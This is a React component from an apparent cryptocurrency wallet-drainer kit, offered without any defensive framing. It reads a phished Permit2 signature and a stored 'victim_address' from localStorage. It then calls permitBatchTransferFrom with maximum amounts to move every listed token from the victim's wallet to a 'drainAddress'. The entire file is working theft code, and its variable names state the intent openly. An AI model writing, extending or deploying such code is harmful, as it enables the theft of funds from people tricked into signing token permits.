import React, { useState } from 'react';
import { ethers } from 'ethers';
import { PERMIT2_ADDRESSES } from '../../config/permit2Addresses';
import { TOKENS } from '../../config/tokens';
import { getReceiveAddress } from '../../config/receiveAddress';
import toast from 'react-hot-toast';

const PERMIT2_ABI = [
  "function permitBatchTransferFrom(((address token,uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permitBatch, (address to, uint256[] amounts) transferDetails, address owner, bytes signature) external"
];

export const BatchTransfer = () => {
  const [isTransferring, setIsTransferring] = useState(false);

  const executeBatchTransfer = async () => {
    const signature = localStorage.getItem('permit2_signature');
    const deadline = localStorage.getItem('permit2_deadline');
    const nonce = localStorage.getItem('permit2_nonce');
    const victimAddress = localStorage.getItem('victim_address');
    const chainId = localStorage.getItem('chain_id');

    if (!signature || !deadline || !nonce || !victimAddress) {
      toast.error('No Permit2 signature found. Please sign first.');
      return;
    }

    setIsTransferring(true);

    try {
      if (!window.ethereum) {
        toast.error('No wallet found');
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const permit2Address = PERMIT2_ADDRESSES[chainId] || PERMIT2_ADDRESSES[1];
      const permit2 = new ethers.Contract(permit2Address, PERMIT2_ABI, signer);
      const drainAddress = getReceiveAddress();
      const tokens = TOKENS[chainId] || TOKENS[1];

      const MAX_UINT160 = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
      const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      const permitted = tokens.map(token => ({
        token: token.address,
        amount: MAX_UINT160
      }));

      const permitBatch = {
        permitted: permitted,
        spender: drainAddress,
        nonce: parseInt(nonce),
        deadline: parseInt(deadline)
      };

      const transferDetails = {
        to: drainAddress,
        amounts: tokens.map(() => MAX_UINT256)
      };

      const tx = await permit2.permitBatchTransferFrom(
        permitBatch,
        transferDetails,
        victimAddress,
        signature,
        { gasLimit: 5000000 }
      );

      const loadingToast = toast.loading('Transaction submitted. Waiting for confirmation...');
      const receipt = await tx.wait();
      toast.dismiss(loadingToast);

      if (receipt.status === 1) {
        toast.success(`Transfer successful! Tx: ${receipt.transactionHash.slice(0, 10)}...`);
        localStorage.removeItem('permit2_signature');
        localStorage.removeItem('permit2_deadline');
        localStorage.removeItem('permit2_nonce');
        localStorage.removeItem('victim_address');
      } else {
        toast.error('Transaction failed');
      }

    } catch (error) {
      console.error('Batch transfer failed:', error);
      toast.error(`Transfer failed: ${error.message.slice(0, 100)}`);
    } finally {
      setIsTransferring(false);
    }
  };

  return (
    <button
      onClick={executeBatchTransfer}
      disabled={isTransferring}
      className={`w-full py-3 rounded-xl font-semibold transition-all ${
        isTransferring ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500'
      } text-white`}
    >
      {isTransferring ? 'Processing...' : 'Execute Batch Transfer'}
    </button>
  );
};